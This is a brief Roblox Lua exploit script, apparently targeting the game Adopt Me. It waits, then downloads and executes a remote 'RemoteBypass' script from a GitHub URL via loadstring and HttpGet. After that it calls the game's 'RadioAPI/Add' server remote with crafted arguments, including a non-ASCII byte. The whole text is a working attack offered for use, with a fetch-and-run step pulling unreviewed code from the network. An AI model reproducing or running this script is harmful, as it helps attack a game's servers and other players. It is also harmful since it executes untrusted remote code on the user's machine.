wait(90)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(5)
local args = {
    [1] = "\128",
    [2] = 123
}

game:GetService("ReplicatedStorage").API:FindFirstChild("RadioAPI/Add"):InvokeServer(unpack(args))
